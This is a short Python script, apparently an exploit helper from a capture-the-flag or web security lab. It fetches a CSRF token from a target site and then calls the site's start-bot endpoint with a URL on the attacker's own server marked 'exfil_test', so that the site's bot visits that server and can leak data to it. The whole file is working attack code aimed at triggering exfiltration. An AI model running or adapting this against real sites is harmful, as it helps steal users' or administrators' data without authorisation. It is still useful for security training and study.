import requests
from context import CONTEXT as context

req = requests.Session()
data = {
    "action" : "run",
    "url" : context['my_server'] + "/exfil_test", 
    "timeout" : 5000
}

req.get(context['target'])
csrf_token = req.get(f'{context['target']}/csrf-token').json()['csrfToken']

r = req.post(f'{context['target']}/start-bot', json=data, headers={ 
    "CSRF-Token": csrf_token,
    "Content-Type": "application/json"
})

print(r.text)
